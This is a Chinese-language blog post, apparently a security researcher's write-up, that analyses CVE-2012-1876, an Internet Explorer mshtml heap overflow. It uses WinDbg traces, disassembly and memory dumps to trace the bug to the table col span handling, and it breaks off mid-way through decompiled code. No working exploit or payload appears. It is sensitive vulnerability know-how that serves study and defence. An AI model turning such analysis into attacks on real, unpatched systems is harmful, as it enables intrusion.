<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">

<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<style>
    .pace .pace-progress {
        background: #1E92FB; /*进度条颜色*/
        height: 3px;
    }
    .pace .pace-progress-inner {
         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
    }
    .pace .pace-activity {
        border-top-color: #1E92FB;    /*上边框颜色*/
        border-left-color: #1E92FB;    /*左边框颜色*/
    }
</style>

























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=6.7.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.7.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=6.7.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.7.0',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="从备份失败的老博客还原出来的">
<meta name="keywords" content="browser,old_blog,vuln">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2012-1876">
<meta property="og:url" content="https://vsane.github.io/2019/01/09/CVE-2012-1876/index.html">
<meta property="og:site_name" content="V4kst1z&#39;s Blog">
<meta property="og:description" content="从备份失败的老博客还原出来的">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://static.zybuluo.com/dane909/5qb5t5o7q8b0gpqk1erlaxpa/QQ%E6%88%AA%E5%9B%BE20180714101436.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/gub02acj9jhm9cafrztw062d/QQ%E6%88%AA%E5%9B%BE20180714103720.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/2bybsboz0u630p78huyjtg2b/QQ%E6%88%AA%E5%9B%BE20180714104017.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/oj4o73w8tsp6mtgay033tceg/QQ%E6%88%AA%E5%9B%BE20180714110524.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/g25qfgzy4fykn5t78ye5bott/QQ%E6%88%AA%E5%9B%BE20180714113957.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/nfy090xfjmna8xe3ssq5evja/QQ%E6%88%AA%E5%9B%BE20180714115734.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/6k7w47diofer76gpzrpvd0vr/QQ%E6%88%AA%E5%9B%BE20180714115446.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/1mdxcyom9jsvtdfuzsmfnbey/2018-07-14_122322.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/ka1p99xec33wshzfh1vmk2om/QQ%E6%88%AA%E5%9B%BE20180714123321.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/jqono2jmfs21xxratn37ehmx/QQ%E6%88%AA%E5%9B%BE20180714131942.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/cg8zwsftoaffweixuhob9qvs/QQ%E6%88%AA%E5%9B%BE20180714145803.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/pu038llh8yi6duts2vx0amgs/QQ%E6%88%AA%E5%9B%BE20180714153902.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/hnap02gjsixvxtm5hctl8j7h/QQ%E6%88%AA%E5%9B%BE20180714180455.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/shl502u8mkftgp93pafmm0l7/QQ%E6%88%AA%E5%9B%BE20180714184432.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/z9s7gej7kf045psmj11ln75p/2018-07-14_184651.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/2t8u5e452lkff3ua3jsis5qe/QQ%E6%88%AA%E5%9B%BE20180714190405.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/l4sz0odv1iecxzddjmtcmg3x/QQ%E6%88%AA%E5%9B%BE20180715134938.png">
<meta property="og:updated_time" content="2019-01-09T09:15:44.737Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2012-1876">
<meta name="twitter:description" content="从备份失败的老博客还原出来的">
<meta name="twitter:image" content="http://static.zybuluo.com/dane909/5qb5t5o7q8b0gpqk1erlaxpa/QQ%E6%88%AA%E5%9B%BE20180714101436.png">



  <link rel="alternate" href="/atom.xml" title="V4kst1z's Blog" type="application/atom+xml">




  <link rel="canonical" href="https://vsane.github.io/2019/01/09/CVE-2012-1876/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>CVE-2012-1876 | V4kst1z's Blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V4kst1z's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tag"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://vsane.github.io/2019/01/09/CVE-2012-1876/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V4kst1z">
      <meta itemprop="description" content="Bin Dog">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V4kst1z's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2012-1876

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-01-09 15:50:11 / Modified: 17:15:44" itemprop="dateCreated datePublished" datetime="2019-01-09T15:50:11+08:00">2019-01-09</time>
            

            
              

              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/01/09/CVE-2012-1876/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/09/CVE-2012-1876/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             Views:  
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>从备份失败的老博客还原出来的<br><a id="more"></a></p>
<h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h2><p>开启 <code>hpa</code> 后打开 <code>poc</code>, <code>windbg</code> 附加进行进程，查看崩溃原因。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c020000 6c0d2000   C:\Windows\System32\jscript.dll</span><br><span class="line">(854.5fc): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=07ddf000 edi=07ddf018</span><br><span class="line">eip=68980a2f esp=0462b9c8 ebp=0462b9d4 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">68980a2f 890f            mov     dword ptr [edi],ecx  ds:0023:07ddf018=????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0462b9d4 687ef47a 00414114 0462bd20 00000001 mshtml!CTableColCalc::AdjustForCol+0x15</span><br><span class="line">0462ba8c 6865a6b8 00000001 0462bd20 000003e8 mshtml!CTableLayout::CalculateMinMax+0x558</span><br><span class="line">0462bca8 68650879 0462bd20 0462bcec 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class="line">0462be54 6875566c 0462d4c8 0462c080 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class="line">0462bf8c 687518f9 07d9aea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">0462c050 68751646 07d9aea8 00013628 00013628 mshtml!CFlowLayout::MeasureSite+0x312</span><br><span class="line">0462c098 687519c1 07724f00 00000061 0462d4c8 mshtml!CFlowLayout::GetSiteWidth+0x156</span><br><span class="line">0462c0d8 68751f70 05568fb0 07d9aea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce</span><br><span class="line">0462c15c 6e17665d 07654ff8 0462c17c 0462c240 mshtml!CEmbeddedILSObj::Fmt+0x150</span><br><span class="line">0462c1ec 6e176399 0763cefc 00000000 07640d20 msls31!ProcessOneRun+0x3e9</span><br><span class="line">0462c248 6e176252 0763cf18 00013fe0 00000000 msls31!FetchAppendEscCore+0x18e</span><br><span class="line">0462c29c 6e1761c3 00000000 00000000 00000014 msls31!LsDestroyLine+0x47f</span><br><span class="line">0462c324 6e17293f 00000007 00002e87 00000000 msls31!LsDestroyLine+0x9ff</span><br><span class="line">0462c360 6874f95e 00000001 00000007 00002e87 msls31!LsCreateLine+0xcb</span><br><span class="line">0462c4b0 68760d1e 0462d4c8 00000007 05568fc0 mshtml!CLSMeasurer::LSDoCreateLine+0x127</span><br><span class="line">0462c554 68761367 0462cdb8 00013628 00000000 mshtml!CLSMeasurer::LSMeasure+0x34</span><br><span class="line">0462c59c 68761223 00000000 00013df8 00000083 mshtml!CLSMeasurer::Measure+0x1e6</span><br><span class="line">0462c5c0 68762d7e 00013df8 00000083 07724f40 mshtml!CLSMeasurer::MeasureLine+0x1c</span><br><span class="line">0462c670 6876b89e 0462cb90 077b8fd8 00000083 mshtml!CRecalcLinePtr::MeasureLine+0x46d</span><br><span class="line">0462ce78 6876b1f1 0462d4c8 00000007 0000000e mshtml!CDisplay::RecalcLines+0x8bb</span><br><span class="line">0462cfc8 6876b034 0462d4c8 00000007 0000000e mshtml!CDisplay::UpdateView+0x208</span><br><span class="line">0462d07c 6876af8b 0462d4c8 0462d600 06f55f10 mshtml!CFlowLayout::CommitChanges+0x9c</span><br><span class="line">0462d18c 6864a711 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcTextSize+0x30f</span><br><span class="line">0462d414 6875adf6 07724f00 0462d600 00000000 mshtml!CFlowLayout::CalcSizeCoreCompat+0x1045</span><br><span class="line">0462d430 68763651 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcSizeCore+0x49</span><br><span class="line">0462d46c 6875ada4 0462d4c8 0462d600 00000000 mshtml!CBodyLayout::CalcSizeCore+0xd8</span><br><span class="line">0462d4a4 6875566c 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcSizeVirtual+0x1af</span><br><span class="line">0462d5dc 686f82bd 07724f00 00000001 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">0462d6cc 68765964 00100000 00000007 069eaeb4 mshtml!CFlowLayout::DoLayout+0x543</span><br><span class="line">0462d708 68748bd8 069ea870 00100000 0462d768 mshtml!CView::ExecuteLayoutTasks+0x3b</span><br><span class="line">0462d74c 686d3acd 00000000 0462d79c 0000003e mshtml!CView::EnsureView+0x355</span><br><span class="line">0462d774 687293c2 069ea870 00000000 06888d58 mshtml!CView::EnsureViewCallback+0xd3</span><br><span class="line">0462d7a8 6871e012 0462d844 00008002 00000000 mshtml!GlobalWndOnMethodCall+0xff</span><br><span class="line">0462d7c8 75dfc4e7 00040276 00000012 00000000 mshtml!GlobalWndProc+0x10c</span><br><span class="line">0462d7f4 75dfc5e7 68706853 00040276 00008002 USER32!InternalCallWinProc+0x23</span><br><span class="line">0462d86c 75dfcc19 00000000 68706853 00040276 USER32!UserCallWinProcCheckWow+0x14b</span><br><span class="line">0462d8cc 75dfcc70 68706853 00000000 0462f9ec USER32!DispatchMessageWorker+0x35e</span><br><span class="line">0462d8dc 6cd94bec 0462d904 00000000 017aef58 USER32!DispatchMessageW+0xf</span><br><span class="line">0462f9ec 6cda4f62 047adfe0 00000000 0168aff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54b</span><br><span class="line">0462faa4 75775c2b 017aef58 00000000 0462fac0 IEFRAME!LCIETab_ThreadProc+0x2c1</span><br><span class="line">0462fab4 76023c45 0168aff0 0462fb00 771d37f5 iertutil!CIsoScope::RegisterThread+0xab</span><br><span class="line">0462fac0 771d37f5 0168aff0 71861b5a 00000000 kernel32!BaseThreadInitThunk+0xe</span><br><span class="line">0462fb00 771d37c8 75775c1d 0168aff0 00000000 ntdll!__RtlUserThreadStart+0x70</span><br><span class="line">0462fb18 00000000 75775c1d 0168aff0 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></table></figure></p>
<p>然后看下 <code>edi</code> 指向的内存信息。<br><img src="http://static.zybuluo.com/dane909/5qb5t5o7q8b0gpqk1erlaxpa/QQ%E6%88%AA%E5%9B%BE20180714101436.png" alt="QQ截图20180714101436.png-26.2kB"><br>由上面的调试信息可知发生了堆溢出。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>下面来看下造成崩溃的 <code>edi</code> 来自哪里，先从崩溃的函数分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; uf mshtml!CTableColCalc::AdjustForCol</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">68980a1a 8bff            mov     edi,edi</span><br><span class="line">68980a1c 55              push    ebp</span><br><span class="line">68980a1d 8bec            mov     ebp,esp</span><br><span class="line">68980a1f 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">68980a21 53              push    ebx</span><br><span class="line">68980a22 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">68980a25 57              push    edi</span><br><span class="line">68980a26 8bc1            mov     eax,ecx</span><br><span class="line">68980a28 83e00f          and     eax,0Fh</span><br><span class="line">68980a2b 8d7e18          lea     edi,[esi+18h]</span><br><span class="line">68980a2e 50              push    eax</span><br><span class="line">68980a2f 890f            mov     dword ptr [edi],ecx</span><br><span class="line">68980a31 e8d3c3daff      call    mshtml!CUnitValue::IsScalerUnit (6872ce09)</span><br><span class="line">68980a36 85c0            test    eax,eax</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>如上，<code>edi=esi+18h</code>，但是这个函数并没有对 <code>esi</code> 的处理，猜测在上一层函数。即函数 <code>mshtml!CTableLayout::CalculateMinMax</code>。根据 <code>ida</code> 的代码交叉引用功能可以找打调用 <code>CTableColCalc::AdjustForCol</code> 地址。<br><img src="http://static.zybuluo.com/dane909/gub02acj9jhm9cafrztw062d/QQ%E6%88%AA%E5%9B%BE20180714103720.png" alt="QQ截图20180714103720.png-9.6kB"></p>
<p><img src="http://static.zybuluo.com/dane909/2bybsboz0u630p78huyjtg2b/QQ%E6%88%AA%E5%9B%BE20180714104017.png" alt="QQ截图20180714104017.png-87.1kB"><br>回溯发现静态分析是没法得到具体信息的，在函数 <code>mshtml!CTableLayout::CalculateMinMax</code> 下断进行调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0:013&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:013&gt; bu mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 e 69dba078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c6e0000 6c792000   C:\Windows\System32\jscript.dll</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85c</span><br><span class="line">eip=69dba078 esp=0466c600 ebp=0466c818 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">69dba078 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; p</span><br><span class="line">...</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85c</span><br><span class="line">eip=69dba084 esp=0466c560 ebp=0466c5fc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">69dba084 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0466c604=07c52ea8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85c</span><br><span class="line">eip=69dba087 esp=0466c560 ebp=0466c5fc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">69dba087 56              push    esi</span><br><span class="line">0:005&gt; ln poi(ebx)</span><br><span class="line">(69cb9960)   mshtml!CTableLayout::`vftable&apos;   |  (69cb9aa0)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">...</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=0466c890 edi=0466c85c</span><br><span class="line">eip=69dba094 esp=0466c55c ebp=0466c5fc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">69dba094 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:07c52efc=00000001</span><br><span class="line">...</span><br><span class="line">0:005&gt; dd ebx+0x54 L1</span><br><span class="line">07c52efc  00000001</span><br></pre></td></tr></table></figure></p>
<p>由调试信息可以猜到这个是在 <code>table</code> 元素建立过程中，<code>ebx+54h</code> 存储的值为1，并且在 <code>poc</code> 中 <code>span=  1</code>，两者之间有什么关系呢，下面我们在 <code>poc</code> 中增加一行，如下<br><img src="http://static.zybuluo.com/dane909/oj4o73w8tsp6mtgay033tceg/QQ%E6%88%AA%E5%9B%BE20180714110524.png" alt="QQ截图20180714110524.png-27.2kB"></p>
<p>继续动态调试可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=07af5ea8 ecx=00412802 edx=ffffffff esi=045ac7a0 edi=045ac76c</span><br><span class="line">eip=6809a094 esp=045ac46c ebp=045ac50c iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">6809a094 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:07af5efc=0000000a</span><br><span class="line">0:005&gt; dd ebx+0x54 L1</span><br><span class="line">07af5efc  0000000a</span><br></pre></td></tr></table></figure></p>
<p>如上我们可以猜测 <code>CTableLayout</code> 对象偏移 <code>0x54</code> 处存储的是 <code>table</code> 标签里 <code>span</code> 元素的总和。在看了 <code>kk</code> 前辈的分析后，发现偏移 <code>0x84</code> 处存储的是是一个数组 <code>TableElementArray</code>，数组成员为 <code>&lt;table&gt;</code> 标签的中的元素在内存中的对象。调试信息如下，至于为什么两个 <code>col</code> 元素但是实际内存中两个后面还有重复的我也不知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd poi(ebx+84)</span><br><span class="line">0703efd8  06be8fd0 0712afd0 0712afd0 0712afd0</span><br><span class="line">0703efe8  0712afd0 0712afd0 0712afd0 0712afd0</span><br><span class="line">0703eff8  0712afd0 0712afd0 ???????? ????????</span><br><span class="line">0703f008  ???????? ???????? ???????? ????????</span><br><span class="line">0703f018  ???????? ???????? ???????? ????????</span><br><span class="line">0703f028  ???????? ???????? ???????? ????????</span><br><span class="line">0703f038  ???????? ???????? ???????? ????????</span><br><span class="line">0703f048  ???????? ???????? ???????? ????????</span><br><span class="line">0:005&gt; ln poi(06be8fd0)</span><br><span class="line">(6801a1d0)   mshtml!CTableCol::`vftable&apos;   |  (67f96b18)   mshtml!CTableSection::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableCol::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; ln poi(0712afd0)</span><br><span class="line">(6801a1d0)   mshtml!CTableCol::`vftable&apos;   |  (67f96b18)   mshtml!CTableSection::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableCol::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p>
<p>在<code>CTableCol</code> 的内存中偏移 0xC 字节处，保存着一个 <code>CAttrArray</code> 对象指针 <code>theTableColAttrArray</code> 。在 <code>theTableColAttrArray</code> 对象内存偏移 <code>0xC</code> 字节处，是一块 0x40<br>字节大小的缓冲区 <code>theTableColAttrInfoBuffer</code>,用于保存 <code>&lt;col&gt;</code>元素属性的信息，如下。<br><img src="http://static.zybuluo.com/dane909/g25qfgzy4fykn5t78ye5bott/QQ%E6%88%AA%E5%9B%BE20180714113957.png" alt="QQ截图20180714113957.png-10.4kB"><br>实际上我们可以先跟踪哪个函数进行了堆的分配。<br><img src="http://static.zybuluo.com/dane909/nfy090xfjmna8xe3ssq5evja/QQ%E6%88%AA%E5%9B%BE20180714115734.png" alt="QQ截图20180714115734.png-17.9kB"><br>如上，可知函数 <code>mshtml!CImplAry::EnsureSizeWorker</code> 完成了堆的分配，<br>后续调试发现<code>CTableLayout</code>偏移 <code>0x90</code> 处存在一个用来与 <code>span</code> 的值进行比较的数。<br><img src="http://static.zybuluo.com/dane909/6k7w47diofer76gpzrpvd0vr/QQ%E6%88%AA%E5%9B%BE20180714115446.png" alt="QQ截图20180714115446.png-22.9kB"><br>之后在 <code>mshtml!CTableLayout::CalculateMinMax</code> 函数调用了 <code>mshtml!CImplAry::EnsureSizeWorker</code>。跟进<code>mshtml!CImplAry::EnsureSizeWorker</code>。<br>发现其调用了 <code>ULongLongToUInt</code>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __userpurge ULongLongToUInt@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;, <span class="keyword">unsigned</span> __int64 